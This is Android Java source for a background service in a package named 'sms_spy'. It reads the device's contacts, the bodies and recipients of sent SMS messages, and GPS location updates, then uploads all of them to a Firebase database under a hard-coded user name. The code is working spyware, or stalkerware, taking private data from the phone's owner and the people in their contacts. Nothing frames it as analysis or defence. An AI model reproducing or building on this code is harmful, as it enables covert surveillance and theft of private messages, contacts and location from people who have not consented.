package com.example.moonc.sms_spy;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.support.v4.app.ActivityCompat;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Date;

/**
 * Created by moonc on 11/10/2017.
 */

public class locationServices extends Service {


    LocationListener locationListener;
    LocationManager locationManager;
    Date new_date;
    String name = "Pushpo" ;
    @Override
    public void onCreate() {
        super.onCreate();
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        Toast.makeText(getApplicationContext(),"Created",Toast.LENGTH_SHORT).show();
        readContacts();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

       // SharedPreferences sharedPreferences = getSharedPreferences("Login_details",MODE_PRIVATE);
        //name = sharedPreferences.getString("name","NAME");



       // if(!name.equals("NAME") && !name.isEmpty()) {

            readContacts();
            Toast.makeText(getApplicationContext(),"Allowed to read  :" + name,Toast.LENGTH_SHORT).show();


            readSMS();
     //   }else
          //  Toast.makeText(getApplicationContext(),"User name is: in location :" + name,Toast.LENGTH_SHORT).show();






       Toast.makeText(getApplicationContext(),"Started",Toast.LENGTH_SHORT).show();
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {
                new_date = new Date();
                String final_location = location.getLongitude() + "@@@@" + location.getLatitude() + "@@@" + new_date;
            //    if(!name.equals("NAME")&&!name.isEmpty()) {
                    FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
                    DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Location");
                    databaseReference.setValue(final_location);
               // }
               Toast.makeText(getApplicationContext(),"New Location " + location.getLatitude() + " " + location.getLongitude(),Toast.LENGTH_SHORT).show();
            }

            @Override
            public void onStatusChanged(String s, int i, Bundle bundle) {

            }

            @Override
            public void onProviderEnabled(String s) {

            }

            @Override
            public void onProviderDisabled(String s) {

            }
        };

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {

            return super.onStartCommand(intent, flags, startId) ;
        }
        else {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 0, locationListener);
        }
        return flags;
    }

    private void readSMS() {
        String Outgoing_message = " ";
        int New_Mgs = 0;
        int res = 0;
        Date date;

       Toast.makeText(getApplicationContext(),"Start reading the sms", Toast.LENGTH_LONG).show();
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/sent"), null, null, null, null);


        SharedPreferences sharedPreferences1 = getSharedPreferences("SMS_LOGs",MODE_PRIVATE);
        int Previous_mes = sharedPreferences1.getInt("Num_of_Messages",0);

        FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
        DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Outgoing_Message");
        int Number_of_Messages = 0;


        New_Mgs = cursor.getCount();
        if(New_Mgs>Previous_mes)
        {
            res = New_Mgs - Previous_mes;
        }

        Toast.makeText(getApplicationContext(), New_Mgs +" "+Previous_mes, Toast.LENGTH_SHORT).show();

        if(res>0) {
            if (cursor.moveToFirst()) {
                Number_of_Messages = cursor.getCount();

                // must check the result to prevent exception
                do {
                         Outgoing_message = "";
                        //msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx) + " \n";
                        date = new Date();
                        Outgoing_message = Outgoing_message + cursor.getString(2) + "@@@@" + cursor.getString(cursor.getColumnIndex("body")) +"@@@@@"+ date;
                        databaseReference.push().setValue(Outgoing_message);

                         res--;

                  Toast.makeText(getApplicationContext(), Outgoing_message, Toast.LENGTH_SHORT).show();

                } while (cursor.moveToNext()&& res>0);
            } else {
                // empty box, no SMS
            }

            SharedPreferences sharedPreferences = getSharedPreferences("SMS_LOGs", MODE_PRIVATE);
            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putInt("Num_of_Messages", Number_of_Messages);
            editor.apply();


        }
           Toast.makeText(getApplicationContext(), " No new Message", Toast.LENGTH_LONG).show();


    }

    private void readContacts() {

        Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null,null, null);
        Toast.makeText(getApplicationContext(),"Start Reading the contacts",Toast.LENGTH_SHORT).show();

        SharedPreferences sharedPreferences = getSharedPreferences("numberOfContacts",MODE_PRIVATE);

        int previous_data = sharedPreferences.getInt("key", 0);

        Toast.makeText(getApplicationContext(),previous_data + " " +phones.getCount(), Toast.LENGTH_SHORT).show();


        if(phones.getCount()!=previous_data) {

                FirebaseDatabase firebaseDatabase = FirebaseDatabase.getInstance();
                DatabaseReference databaseReference = firebaseDatabase.getReference().child(name).child("Contacts");

                databaseReference.setValue(null);
            DatabaseReference databaseReference_updated = firebaseDatabase.getReference().child(name).child("Contacts");

                previous_data = phones.getCount();

                while (phones.moveToNext()) {
                    String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    Toast.makeText(getApplicationContext(), name, Toast.LENGTH_SHORT).show();
                    String Final_str = name + "@@@@" + phoneNumber;
                    databaseReference_updated.push().setValue(Final_str);
                }


            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putInt("key",previous_data);
            editor.apply();
        }
        phones.close();


    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
